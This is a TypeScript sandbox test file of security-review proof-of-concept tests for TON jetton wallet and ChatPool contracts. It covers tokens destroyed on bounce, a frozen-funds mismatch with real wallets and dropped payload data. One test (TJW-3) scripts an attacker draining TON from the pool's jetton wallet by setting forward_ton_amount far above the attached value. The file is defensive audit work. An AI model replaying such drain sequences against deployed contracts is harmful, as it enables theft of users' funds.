// Security-review PoCs for TestJettonWallet (contracts/test_jetton.tact).
// Read-only w.r.t. contracts/wrappers/build: uses existing build artifacts.
//
// REF_WALLET_B64 / USDT_WALLET_B64 are the code BOCs of the upstream
//   ton-blockchain/token-contract  ft/jetton-wallet.fc   (reference TEP-74)
//   ton-blockchain/stablecoin-contract contracts/jetton-wallet.fc (USDT)
// compiled with @ton-community/func-js 0.11 from their `main` branches.
import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Address, beginCell, Cell, contractAddress, toNano } from '@ton/core';
import { keyPairFromSeed, KeyPair } from '@ton/crypto';
import { TestJettonMinter, TestJettonWallet } from '../../wrappers/TestJetton';
import { ChatPool, storeAdminInitVoucher, storeClaimVoucher, storeDepositVoucher } from '../../wrappers/ChatPool';
import '@ton/test-utils';
import { signatureCell, signVoucher, TAG } from '../helpers/vouchers';

const REF_WALLET_B64 =
    'te6ccgECEgEAAzQAART/APSkE/S88sgLAQIBYgIDAgLMBAUAG6D2BdqJofQB9IH0gahhAgHUBgcCAUgICQDDCDHAJJfBOAB0NMDAXGwlRNfA/AL4PpA+kAx+gAxcdch+gAx+gAwc6m0AALTH4IQD4p+pVIgupUxNFnwCOCCEBeNRRlSILqWMUREA/AJ4DWCEFlfB7y6k1nwCuBfBIQP8vCAAET6RDBwuvLhTYAIBIAoLAgEgEBEB8QD0z/6APpAIfAB7UTQ+gD6QPpA1DBRNqFSKscF8uLBKML/8uLCVDRCcFQgE1QUA8hQBPoCWM8WAc8WzMkiyMsBEvQA9ADLAMkg+QBwdMjLAsoHy//J0AT6QPQEMfoAINdJwgDy4sR3gBjIywVQCM8WcPoCF8trE8yAMA/c7UTQ+gD6QPpA1DAI0z/6AFFRoAX6QPpAU1vHBVRzbXBUIBNUFAPIUAT6AljPFgHPFszJIsjLARL0APQAywDJ+QBwdMjLAsoHy//J0FANxwUcsfLiwwr6AFGooYIImJaAggiYloAStgihggjk4cCgGKEn4w8l1wsBwwAjgDQ4PAK6CEBeNRRnIyx8Zyz9QB/oCIs8WUAbPFiX6AlADzxbJUAXMI5FykXHiUAioE6CCCOThwKoAggiYloCgoBS88uLFBMmAQPsAECPIUAT6AljPFgHPFszJ7VQAcFJ5oBihghBzYtCcyMsfUjDLP1j6AlAHzxZQB88WyXGAEMjLBSTPFlAG+gIVy2oUzMlx+wAQJBAjAA4QSRA4N18EAHbCALCOIYIQ1TJ223CAEMjLBVAIzxZQBPoCFstqEssfEss/yXL7AJM1bCHiA8hQBPoCWM8WAc8WzMntVADbO1E0PoA+kD6QNQwB9M/+gD6QDBRUaFSSccF8uLBJ8L/8uLCggjk4cCqABagFrzy4sOCEHvdl97Iyx8Vyz9QA/oCIs8WAc8WyXGAGMjLBSTPFnD6AstqzMmAQPsAQBPIUAT6AljPFgHPFszJ7VSAAgyAINch7UTQ+gD6QPpA1DAE0x+CEBeNRRlSILqCEHvdl94TuhKx8uLF0z8x+gAwE6BQI8hQBPoCWM8WAc8WzMntVIA==';
const USDT_WALLET_B64 =
    'te6ccgECDwEAA9EAART/APSkE/S88sgLAQIBYgIDAvjQAdDTAwFxsI5IE18DgCDXIe1E0NMD+gD6QPpA0QTTHwGEDyGCEBeNRRm6AoIQe92X3roSsfL0gEDXIfoAMBKgQBMDyMsDWPoCAc8WAc8Wye1U4PpA+kAx+gAx9AH6ADH6AAExcPg6AtMfASCCEA+KfqW6joUwNFnbPOAzBAUCASANDgHyA9M/AQH6APpAIfpEMMAA8uFN7UTQ0wP6APpA+kDRUwnHBSRxsMAAIbHyrVIrxwVQCrHy4ElRFaEgwv/yr/gqVCWQcFRgBBMVA8jLA1j6AgHPFgHPFskhyMsBE/QAEvQAywDJIPkAcHTIywLKB8v/ydAE+kD0AfoAIAYC0CKCEBeNRRm6joQyWts84DQhghBZXwe8uo6EMQHbPOAyIIIQ7tI207qOLzABgEDXIdMD0e1E0NMD+gD6QPpA0TNRQscF8uBKQDMDyMsDWPoCAc8WAc8Wye1U4GwhghDTchWMutyED/LwCAkBmCDXCwCa10vAAQHAAbDysZEw4siCEBeNRRkByx9QCgHLP1AI+gIjzxYBzxYm+gJQB88WyciAGAHLBVAEzxZw+gJAY3dQA8trzMzJRTcHALQhkXKRceL4OSBuk4EkJ5Eg4iFulDGBKHORAeJQI6gToHOBA6Nw+DygAnD4NhKgAXD4NqBzgQQJghAJZgGAcPg3oLzysASAUPsAWAPIywNY+gIBzxYBzxbJ7VQD9O1E0NMD+gD6QPpA0SNysMAC8m0H0z8BAfoAUUGgBPpA+kBTuscF+CpUZOBwVGAEExUDyMsDWPoCAc8WAc8WySHIywET9AAS9ADLAMn5AHB0yMsCygfL/8nQUAzHBRux8uBKCfoAIZJfBOMNJtcLAcAAs5MwbDPjDVUCCgsMAfLtRNDTA/oA+kD6QNEG0z8BAfoA+kD0AdFRQaFSiMcF8uBJJsL/8q/IghB73ZfeAcsfWAHLPwH6AiHPFljPFsnIgBgBywUmzxZw+gIBcVjLaszJA/g5IG6UMIEWn95xgQLycPg4AXD4NqCBGndw+DagvPKwAoBQ+wADDABgyIIQc2LQnAHLHyUByz9QBPoCWM8WWM8WyciAEAHLBSTPFlj6AgFxWMtqzMmAEfsAAHpQVKH4L6BzgQQJghAJZgGAcPg3tgly+wLIgBABywVQBc8WcPoCcAHLaoIQ1TJ22wHLH1gByz/JgQCC+wBZACADyMsDWPoCAc8WAc8Wye1UACe/2BdqJoaYH9AH0gfSBomfwVIJhAAhvFCPaiaGmB/QB9IH0gaK+Bw=';

const CHAT_ID = 1001234567890n;
const farFuture = () => BigInt(Math.floor(Date.now() / 1000) + 3600);

describe('TestJettonWallet PoC', () => {
    let blockchain: Blockchain;
    let deployer: SandboxContract<TreasuryContract>;
    let alice: SandboxContract<TreasuryContract>;
    let bob: SandboxContract<TreasuryContract>;
    let minter: SandboxContract<TestJettonMinter>;

    async function walletOf(owner: Address) {
        return blockchain.openContract(TestJettonWallet.fromAddress(await minter.getGetWalletAddress(owner)));
    }
    async function balOf(owner: Address): Promise<bigint> {
        const w = await walletOf(owner);
        const st = await blockchain.getContract(w.address);
        if (st.accountState?.type !== 'active') return 0n;
        return w.getWalletBalance();
    }

    beforeEach(async () => {
        blockchain = await Blockchain.create();
        deployer = await blockchain.treasury('deployer');
        alice = await blockchain.treasury('alice');
        bob = await blockchain.treasury('bob');
        minter = blockchain.openContract(
            await TestJettonMinter.fromInit(deployer.address, beginCell().storeUint(0, 8).endCell()),
        );
        await minter.send(deployer.getSender(), { value: toNano('0.05') }, { $$type: 'Deploy', queryId: 0n });
        await minter.send(
            deployer.getSender(),
            { value: toNano('0.2') },
            {
                $$type: 'Mint',
                amount: toNano('1000'),
                recipient: alice.address,
            },
        );
        expect(await balOf(alice.address)).toEqual(toNano('1000'));
    });

    // ---------------------------------------------------------------- TJW-1
    describe('TJW-1: tokens destroyed when the receiving wallet throws (no bounced handler)', () => {
        const cases: [string, Cell][] = [
            // TEP-74 text comment, Either-left (inline): 0 bit + op 0 + text
            ['inline text comment', beginCell().storeUint(0, 1).storeUint(0, 32).storeStringTail('hi').endCell()],
            // empty forward payload (no Either bit) with forward_ton_amount > 0
            ['empty payload', beginCell().endCell()],
            // ref-wrapped but the ref is too large to be inlined into the notification
            [
                'ref-wrapped 900-bit payload',
                beginCell().storeUint(1, 1).storeRef(beginCell().storeUint(0, 900).endCell()).endCell(),
            ],
        ];
        for (const [name, payload] of cases) {
            it(name, async () => {
                const aw = await walletOf(alice.address);
                const res = await aw.send(
                    alice.getSender(),
                    { value: toNano('0.3') },
                    {
                        $$type: 'JettonTransfer',
                        queryId: 7n,
                        amount: toNano('100'),
                        destination: bob.address,
                        responseDestination: alice.address,
                        customPayload: null,
                        forwardTonAmount: toNano('0.05'),
                        forwardPayload: payload,
                    },
                );
                const bw = await walletOf(bob.address);
                // receiving wallet aborts...
                expect(res.transactions).toHaveTransaction({ from: aw.address, to: bw.address, success: false });
                // ...the bounce comes back and is silently accepted (router returns on msg_bounced)
                expect(res.transactions).toHaveTransaction({ from: bw.address, to: aw.address, success: true });
                const a = await balOf(alice.address);
                const b = await balOf(bob.address);
                console.log(`[TJW-1 ${name}] alice=${a} bob=${b} minted=${await minter.getMintedTotal()}`);
                expect(a).toEqual(toNano('900')); // debited, never restored
                expect(b).toEqual(0n);
                expect(a + b).toBeLessThan(await minter.getMintedTotal()); // 100 tokens vanished
            });
        }
    });

    // ---------------------------------------------------------------- TJW-2
    it('TJW-2: no value check on JettonTransfer -> receiver underfunded -> tokens lost', async () => {
        const aw = await walletOf(alice.address);
        // forward_ton_amount larger than attached value; Bob's wallet is fresh (0 TON)
        const res = await aw.send(
            alice.getSender(),
            { value: toNano('0.05') },
            {
                $$type: 'JettonTransfer',
                queryId: 1n,
                amount: toNano('10'),
                destination: bob.address,
                responseDestination: alice.address,
                customPayload: null,
                forwardTonAmount: toNano('1'),
                forwardPayload: beginCell().storeUint(1, 1).storeRef(beginCell().endCell()).endCell(),
            },
        );
        const bw = await walletOf(bob.address);
        const tx = res.transactions.find((t) => t.inMessage?.info.dest?.toString() === bw.address.toString());
        const d: any = tx!.description;
        console.log(
            `[TJW-2] compute success=${d.computePhase?.success} action success=${d.actionPhase?.success} resultCode=${d.actionPhase?.resultCode} aborted=${d.aborted}`,
        );
        console.log(`[TJW-2] alice=${await balOf(alice.address)} bob=${await balOf(bob.address)}`);
        expect(await balOf(alice.address)).toEqual(toNano('990'));
        expect(await balOf(bob.address)).toEqual(0n);
    });

    // ---------------------------------------------------------------- shared ChatPool setup
    async function setupPool(): Promise<{
        pool: SandboxContract<ChatPool>;
        backend: KeyPair;
        admin: SandboxContract<TreasuryContract>;
    }> {
        const master = await blockchain.treasury('distributor-master');
        const admin = await blockchain.treasury('pool-admin');
        const backend = keyPairFromSeed(Buffer.alloc(32, 7));
        const pool = blockchain.openContract(
            await ChatPool.fromInit(master.address, CHAT_ID, BigInt('0x' + backend.publicKey.toString('hex'))),
        );
        await pool.send(admin.getSender(), { value: toNano('0.1') }, { $$type: 'Deploy', queryId: 0n });
        const voucher = beginCell()
            .store(
                storeAdminInitVoucher({
                    $$type: 'AdminInitVoucher',
                    chatId: CHAT_ID,
                    master: master.address,
                    admin: admin.address,
                    expiry: farFuture(),
                }),
            )
            .endCell();
        await pool.send(
            admin.getSender(),
            { value: toNano('0.05') },
            {
                $$type: 'SetAdmin',
                voucherCell: voucher,
                signature: signatureCell(signVoucher(voucher, backend, TAG.Admin, pool.address)),
            },
        );
        expect((await pool.getPoolAdmin())!.equals(admin.address)).toBe(true);
        return { pool, backend, admin };
    }

    function depositPayloadCell(backend: KeyPair, pool: Address, jettonMaster: Address, poolWallet: Address): Cell {
        const voucher = beginCell()
            .store(
                storeDepositVoucher({
                    $$type: 'DepositVoucher',
                    chatId: CHAT_ID,
                    jettonMaster,
                    expectedJettonWallet: poolWallet,
                    expiry: farFuture(),
                }),
            )
            .endCell();
        const sig = signVoucher(voucher, backend, TAG.Deposit, pool);
        return beginCell().storeRef(voucher).storeBuffer(sig).endCell();
    }

    function claimMsg(
        backend: KeyPair,
        pool: Address,
        recipient: Address,
        jettonMaster: Address,
        amount: bigint,
        nonce: bigint,
    ) {
        const voucher = beginCell()
            .store(
                storeClaimVoucher({
                    $$type: 'ClaimVoucher',
                    chatId: CHAT_ID,
                    recipient,
                    jettonMaster,
                    amount,
                    nonce,
                    expiry: farFuture(),
                }),
            )
            .endCell();
        return {
            $$type: 'Claim' as const,
            voucherCell: voucher,
            signature: signatureCell(signVoucher(voucher, backend, TAG.Claim, pool)),
        };
    }

    // ---------------------------------------------------------------- TJW-3
    it('TJW-3: anyone drains TON held by the pool jetton wallet via forward_ton_amount > msg.value', async () => {
        const { pool, backend } = await setupPool();
        const poolWallet = await walletOf(pool.address);
        // honest deposit deploys the pool wallet
        const aw = await walletOf(alice.address);
        await aw.send(
            alice.getSender(),
            { value: toNano('0.25') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount: toNano('100'),
                destination: pool.address,
                responseDestination: alice.address,
                customPayload: null,
                forwardTonAmount: toNano('0.15'),
                forwardPayload: beginCell()
                    .storeUint(1, 1)
                    .storeRef(depositPayloadCell(backend, pool.address, minter.address, poolWallet.address))
                    .endCell(),
            },
        );
        expect(await pool.getBalanceOf(minter.address)).toEqual(toNano('100'));
        // TON that sits on the pool wallet (accumulated 0.02 TON/transfer reserves, accidental top-ups)
        await deployer.send({ to: poolWallet.address, value: toNano('2'), bounce: false });

        const attacker = await blockchain.treasury('attacker');
        await minter.send(
            deployer.getSender(),
            { value: toNano('0.2') },
            { $$type: 'Mint', amount: 1n, recipient: attacker.address },
        );
        const xw = await walletOf(attacker.address);

        const before = await attacker.getBalance();
        const wBefore = (await blockchain.getContract(poolWallet.address)).balance;
        const res = await xw.send(
            attacker.getSender(),
            { value: toNano('0.1') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount: 1n,
                destination: pool.address,
                responseDestination: attacker.address,
                customPayload: null,
                forwardTonAmount: toNano('1.9'), // >> attached 0.1 TON
                forwardPayload: beginCell()
                    .storeUint(1, 1)
                    .storeRef(beginCell().storeUint(0xdead, 16).endCell())
                    .endCell(),
            },
        );
        expect(res.transactions).toHaveTransaction({
            from: poolWallet.address,
            to: pool.address,
            value: toNano('1.9'),
        });
        const after = await attacker.getBalance();
        const wAfter = (await blockchain.getContract(poolWallet.address)).balance;
        console.log(
            `[TJW-3] attacker net TON = ${Number(after - before) / 1e9}, pool wallet TON ${Number(wBefore) / 1e9} -> ${Number(wAfter) / 1e9}`,
        );
        expect(after - before).toBeGreaterThan(toNano('1.5'));
        expect(await balOf(attacker.address)).toEqual(1n); // jetton refunded too: free drain
        expect(await pool.getBalanceOf(minter.address)).toEqual(toNano('100'));
    });

    // ---------------------------------------------------------------- TJW-6 (production mismatch)
    // The same ChatPool claim that succeeds with TestJettonWallet bounces on a
    // reference TEP-74 wallet (exit 708) and on the USDT wallet (exit 9),
    // because ChatPool.sendJettons sends forward_payload = emptySlice()
    // (no Either bit) and TestJettonWallet never parses it when forward_ton_amount = 0.
    function refWalletInit(code: Cell, owner: Address, master: Address) {
        const data = beginCell().storeCoins(0).storeAddress(owner).storeAddress(master).storeRef(code).endCell();
        return { code, data };
    }
    function usdtWalletInit(code: Cell, owner: Address, master: Address) {
        const data = beginCell().storeUint(0, 4).storeCoins(0).storeAddress(owner).storeAddress(master).endCell();
        return { code, data };
    }

    for (const [label, b64, mkInit, expectedExit] of [
        ['reference token-contract wallet', REF_WALLET_B64, refWalletInit, 708],
        ['USDT stablecoin wallet', USDT_WALLET_B64, usdtWalletInit, 9],
    ] as const) {
        it(`TJW-6: ChatPool claim/withdraw work on TestJettonWallet but bounce on ${label}`, async () => {
            const { pool, backend, admin } = await setupPool();
            const fakeMaster = await blockchain.treasury('real-jetton-master');
            const code = Cell.fromBase64(b64);
            const init = mkInit(code, pool.address, fakeMaster.address);
            const poolWallet = contractAddress(0, init);

            // master mints 100 jettons into the pool's real wallet with a deposit voucher
            // (wallet forwards the payload VERBATIM: shape 2 = 1 bit + ref)
            const fp = depositPayloadCell(backend, pool.address, fakeMaster.address, poolWallet);
            const body = beginCell()
                .storeUint(0x178d4519, 32)
                .storeUint(0, 64)
                .storeCoins(toNano('100'))
                .storeAddress(admin.address)
                .storeAddress(admin.address)
                .storeCoins(toNano('0.15'))
                .storeUint(1, 1)
                .storeRef(fp)
                .endCell();
            const dep = await fakeMaster.send({ to: poolWallet, value: toNano('0.3'), init, body, bounce: false });
            expect(dep.transactions).toHaveTransaction({ from: poolWallet, to: pool.address, success: true });
            expect(await pool.getBalanceOf(fakeMaster.address)).toEqual(toNano('100'));
            await pool.send(
                admin.getSender(),
                { value: toNano('0.05') },
                { $$type: 'SetClaimLimit', jettonMaster: fakeMaster.address, dailyLimit: toNano('1000') },
            );

            // claim
            const user = await blockchain.treasury('claimer');
            const res = await pool.send(
                user.getSender(),
                { value: toNano('0.15') },
                claimMsg(backend, pool.address, user.address, fakeMaster.address, toNano('10'), 1n),
            );
            expect(res.transactions).toHaveTransaction({
                from: pool.address,
                to: poolWallet,
                success: false,
                exitCode: expectedExit,
            });
            expect(res.transactions).toHaveTransaction({ from: poolWallet, to: pool.address, inMessageBounced: true });
            expect(await pool.getBalanceOf(fakeMaster.address)).toEqual(toNano('100')); // restored, nothing paid
            expect(await pool.getIsNonceUsed(1n)).toBe(false);

            // admin withdraw: same failure, funds can never leave the pool
            const wr = await pool.send(
                admin.getSender(),
                { value: toNano('0.1') },
                {
                    $$type: 'WithdrawRemainder',
                    jettonMaster: fakeMaster.address,
                    amount: toNano('100'),
                    to: admin.address,
                },
            );
            expect(wr.transactions).toHaveTransaction({
                from: pool.address,
                to: poolWallet,
                success: false,
                exitCode: expectedExit,
            });
            const fwd = res.transactions.find(
                (t) =>
                    t.inMessage?.info.dest?.toString() === poolWallet.toString() &&
                    t.inMessage.info.type === 'internal',
            )!;
            const claimValue = (fwd.inMessage!.info as any).value.coins as bigint;
            console.log(
                `[TJW-6 ${label}] claim + withdraw bounced with exit ${expectedExit}; claim forwards ${Number(claimValue) / 1e9} TON to the wallet`,
            );

            // Same JettonTransfer with a well-formed Either-left (single 0 bit) payload and the same
            // TON value, sent by an owner treasury to its own real wallet: does it go through?
            const owner2 = await blockchain.treasury('owner2');
            const init2 = mkInit(code, owner2.address, fakeMaster.address);
            const w2 = contractAddress(0, init2);
            await fakeMaster.send({
                to: w2,
                value: toNano('0.1'),
                init: init2,
                bounce: false,
                body: beginCell()
                    .storeUint(0x178d4519, 32)
                    .storeUint(0, 64)
                    .storeCoins(toNano('100'))
                    .storeAddress(owner2.address)
                    .storeUint(0, 2)
                    .storeCoins(0)
                    .storeUint(0, 1)
                    .endCell(),
            });
            const fixedBody = beginCell()
                .storeUint(0xf8a7ea5, 32)
                .storeUint(1, 64)
                .storeCoins(toNano('10'))
                .storeAddress(user.address)
                .storeAddress(user.address)
                .storeUint(0, 1)
                .storeCoins(0)
                .storeUint(0, 1)
                .endCell();
            // ~ what a minimum-value claim (PoolMinClaimValue + PoolClaimStorageFee = 0.052) forwards
            const minFwd = claimValue - (toNano('0.15') - toNano('0.052'));
            const ok = await owner2.send({ to: w2, value: minFwd, body: fixedBody, bounce: true });
            expect(ok.transactions).toHaveTransaction({ from: owner2.address, to: w2, success: true, aborted: false });
            expect(ok.transactions).toHaveTransaction({ from: w2, success: true, deploy: true }); // recipient wallet credited
            console.log(`[TJW-6 ${label}] 0-bit payload transfer with ${Number(minFwd) / 1e9} TON: accepted`);
        });
    }

    it('TJW-6 control: same claim succeeds with TestJettonWallet (masks the bug)', async () => {
        const { pool, backend, admin } = await setupPool();
        const poolWallet = await walletOf(pool.address);
        const aw = await walletOf(alice.address);
        await aw.send(
            alice.getSender(),
            { value: toNano('0.25') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount: toNano('100'),
                destination: pool.address,
                responseDestination: alice.address,
                customPayload: null,
                forwardTonAmount: toNano('0.15'),
                forwardPayload: beginCell()
                    .storeUint(1, 1)
                    .storeRef(depositPayloadCell(backend, pool.address, minter.address, poolWallet.address))
                    .endCell(),
            },
        );
        await pool.send(
            admin.getSender(),
            { value: toNano('0.05') },
            { $$type: 'SetClaimLimit', jettonMaster: minter.address, dailyLimit: toNano('1000') },
        );
        const res = await pool.send(
            bob.getSender(),
            { value: toNano('0.15') },
            claimMsg(backend, pool.address, bob.address, minter.address, toNano('10'), 1n),
        );
        expect(res.transactions).toHaveTransaction({ from: pool.address, to: poolWallet.address, success: true });
        expect(await balOf(bob.address)).toEqual(toNano('10'));
    });

    // ---------------------------------------------------------------- TJW-7 / sanity
    it('sanity: forged internal transfer from a non-sibling is rejected', async () => {
        const bw = await walletOf(bob.address);
        const body = beginCell()
            .storeUint(0x178d4519, 32)
            .storeUint(0, 64)
            .storeCoins(toNano('1000000'))
            .storeAddress(bob.address)
            .storeUint(0, 2)
            .storeCoins(0)
            .endCell();
        // attacker claims to be Bob's own sibling, from his own address
        const res = await deployer.send({
            to: bw.address,
            value: toNano('0.1'),
            body,
            init: (await TestJettonWallet.fromInit(bob.address, minter.address)).init!,
        });
        expect(res.transactions).toHaveTransaction({ to: bw.address, success: false, exitCode: 14236 });
    });

    it('TJW-8: trailing data after the ref-wrapped payload is silently dropped', async () => {
        const echo = await blockchain.treasury('echo');
        const aw = await walletOf(alice.address);
        const payload = beginCell()
            .storeUint(1, 1)
            .storeRef(beginCell().storeUint(0xaa, 8).endCell())
            .storeUint(0xbeef, 16)
            .endCell();
        const res = await aw.send(
            alice.getSender(),
            { value: toNano('0.3') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount: 1n,
                destination: echo.address,
                responseDestination: null,
                customPayload: null,
                forwardTonAmount: toNano('0.01'),
                forwardPayload: payload,
            },
        );
        const note = res.transactions.find(
            (t) =>
                t.inMessage?.info.dest?.toString() === echo.address.toString() &&
                t.inMessage.body.beginParse().preloadUint(32) === 0x7362d09c,
        )!;
        const s = note.inMessage!.body.beginParse();
        s.skip(32 + 64);
        s.loadCoins();
        s.loadAddress();
        console.log(`[TJW-8] notification payload bits=${s.remainingBits} refs=${s.remainingRefs}`);
        expect(s.remainingBits).toEqual(8); // unwrapped ref content only; 0xbeef lost, Either bit gone
        // responseDestination=null: TEP-74 keeps the excess; this wallet sends it to the owner
        const w = await walletOf(echo.address);
        expect(res.transactions).toHaveTransaction({ from: w.address, to: echo.address, op: 0xd53276db });
    });
});
